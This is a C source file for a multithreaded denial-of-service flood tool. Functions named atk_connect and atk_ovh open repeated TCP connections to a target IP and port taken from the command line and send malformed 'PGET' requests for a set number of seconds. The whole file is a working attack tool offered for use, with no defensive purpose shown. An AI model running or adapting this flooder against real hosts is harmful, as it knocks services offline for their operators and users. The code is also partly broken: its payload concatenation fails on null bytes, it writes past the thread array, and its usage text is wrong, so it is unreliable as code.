#include <errno.h>
#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <pthread.h>

int rps = 0;

const char *useragents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
};

typedef struct info {
    char *path;
    in_addr_t addr;

    int port, seconds;
} info_t;

#define PAYLOAD "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

void rps_counter(void) {
    while(1) {
        sleep(1);
        
        printf("[info] [%d] requests per second\n", rps);

        rps = 0;
    }
}

void atk_watch(int seconds) {
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);

        sleep(seconds);

        kill(getppid(), 9);
    }
}

int atk_connect(in_addr_t address, int port) {
    int sock;
    if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        printf("[socket] %s\n", strerror(errno));
        
        return -1;
    }

    struct sockaddr_in addr = {
        .sin_addr.s_addr = address,
        .sin_port = htons(port),
        .sin_family = AF_INET
    
    };

    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
        printf("[connection] %s\n", strerror(errno));
        
        return -1;
    }

    return sock;
}

char *atk_make_request(info_t *args) {
    char *buf = malloc(1024);
    
    strcpy(buf, "PGET \0\0\0\0\0\0");
    strcat(buf, PAYLOAD); //wtf is wrong with this method
    strcat(buf, " HTTP/1.1\r\nHost: ");
    strcat(buf, inet_ntoa((struct in_addr){args->addr}));
    
    strcat(buf, "\r\nUser-Agent: ");
    strcat(buf, useragents[rand() % sizeof(useragents)/sizeof(useragents[0])]);

    strcat(buf, "\r\nConnection: close\r\n\r\n");

    return buf;
}

void atk_ovh(void *arg) {
    info_t *args = (info_t *)arg;

    srand(time(NULL) ^ getpid() * getppid());
    
    int sock;
    
    char *request = atk_make_request(args);
    atk_watch(args->seconds);

    while(1) {
        if((sock = atk_connect(args->addr, args->port)) != -1) {
            if(send(sock, request, strlen(request), MSG_NOSIGNAL) != -1)
                rps++;
            
            close(sock);
        }
    }

    close(sock);
    free(request);
}

int main(int argc, char **args) {
    if(argc != 5) {
        int _ = write(1, "invalid usage\r\n./script [ip] [port] [time] [path]\r\n", 51);

        return 0;
    }

    info_t atk_args = {
        .addr = inet_addr(args[1]),
        .port = atoi(args[2]),
        .seconds = atoi(args[3])
    };

    int threads = atoi(args[4]) /*/ 2*/;

    pthread_t thread[threads];

    for(int i = 0; i < threads; i++) {
        pthread_create(&thread[i], NULL, (void *)&atk_ovh, (void *)&atk_args);
        
        printf("[init] started thread [%d]\n", i);
    }

    pthread_create(&thread[threads], NULL, (void *)rps_counter, NULL);

    sleep(atk_args.seconds);
}
